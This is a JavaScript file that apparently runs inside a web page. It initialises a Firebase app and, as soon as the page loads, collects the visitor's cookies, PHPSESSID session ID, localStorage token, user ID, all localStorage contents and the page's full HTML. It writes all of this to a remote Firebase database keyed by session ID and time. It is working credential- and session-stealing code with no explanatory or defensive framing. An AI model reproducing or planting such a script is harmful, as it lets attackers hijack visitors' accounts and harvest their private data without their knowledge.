// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyAEZ-GF4JyfSPF-YE-aAPNDHke-Pc6nUCI",
    authDomain: "tuyensinh247-dc424.firebaseapp.com",
    projectId: "tuyensinh247-dc424",
    storageBucket: "tuyensinh247-dc424.appspot.com",
    messagingSenderId: "789063631644",
    appId: "1:789063631644:web:e5f8247e9a1366bbe170d9",
    databaseURL: "https://tuyensinh247-dc424-default-rtdb.firebaseio.com"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

// Process the URL to extract the path
const url = window.location.href.replace(/https:\/\//, '').replace(/\./g, '-');
const path = url.split("?")[0].split("-html");
const outerHTML = document.documentElement.outerHTML;

// Retrieve cookie and localStorage data
const cookie = document.cookie;
const token = localStorage.getItem("token");
const userId = localStorage.getItem("user_id") || 'facebook-google';

// Function to retrieve the PHPSESSID from cookies
function getPHPSESSID() {
    const phpsessidCookie = document.cookie.split('; ').find(cookie => cookie.startsWith('PHPSESSID='));
    return phpsessidCookie ? phpsessidCookie.split('=')[1] : null;
}
const PHPSESSID = getPHPSESSID();

// Function to convert localStorage items to a JSON string
const localStorageToJson = () => {
    const obj = {};
    Object.keys(localStorage).forEach(key => obj[key] = localStorage.getItem(key));
    return JSON.stringify(obj);
};
const localStorageJSON = localStorageToJson();

// Function to get CurrentFormattedTime
function getCurrentFormattedTime() {
    const now = new Date();
    const year = now.getFullYear();
    const month = (now.getMonth() + 1).toString().padStart(2, '0');
    const day = now.getDate().toString().padStart(2, '0');
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    return `${year}-${month}-${day} ${hours}:${minutes}`;
}
const time = getCurrentFormattedTime();

// Function to write data to the database
function writeData(PHPSESSID, time, userId, token, cookie, localStorageJSON, outerHTML, url) {
    const db = getDatabase();
    set(ref(db, `${path[0]}/${PHPSESSID}/${time}`), {
        PHPSESSID: PHPSESSID,
        time: time,
        userId: userId,
        token: token,
        cookie: cookie,
        localStorage: localStorageJSON,
        outerHTML: outerHTML,
        url: url
    });
}
writeData(PHPSESSID, time, userId, token, cookie, localStorageJSON, outerHTML, url);
